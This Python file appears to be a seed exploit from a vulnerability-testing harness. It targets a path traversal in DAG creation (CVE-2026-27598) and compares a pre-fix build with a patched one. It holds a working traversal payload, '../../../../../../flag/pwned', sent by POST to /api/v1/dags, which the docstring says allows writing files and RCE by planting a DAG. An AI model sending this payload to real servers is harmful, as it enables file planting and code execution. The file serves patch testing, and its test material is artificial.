#!/usr/bin/env python3
"""[GIVEN] CVE-2026-27598 seed exploit — path traversal in DAG *creation*.

CVE-2026-27598 is a WRITE primitive: POST /api/v1/dags with a traversal DAG name
writes an arbitrary YAML file outside the DAGs directory (RCE via a planted DAG).

Contract in this case (verified on real Docker):
  - V0 (pre-fix, commit 6c53bfd): the create succeeds (HTTP 201) and writes
    ../../../../../../flag/pwned.yaml outside /data/dags.
  - V1 (v2.3.0, 27598-patched): BLOCKED (HTTP 400) — CreateNewDAG now calls
    core.ValidateDAGName, which rejects path separators (regex ^[a-zA-Z0-9_.-]+$).

NOTE (honest): this seed is a WRITE. It returns {"name": ...} and never reads the
read-exfil canary, so it cannot "reach the flag" on V0. The CVE-2026-27598 fix
guards only the create verb, while the CVE-2026-33344 residual is on the read verb
(GET /dags/{fileName}/spec) — the two do not share a flag channel, so the
read-exfil differential gate is UNSATISFIABLE for this pair. See repro.log.
"""
from __future__ import annotations

# Traversal name rejected by ValidateDAGName on V1, accepted on V0.
NAME = "../../../../../../flag/pwned"


def candidate() -> dict:
    return {
        "probe_id": "cve-2026-27598-create-traversal",
        "method": "POST",
        "path": "/api/v1/dags",
        "json": {"name": NAME},
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
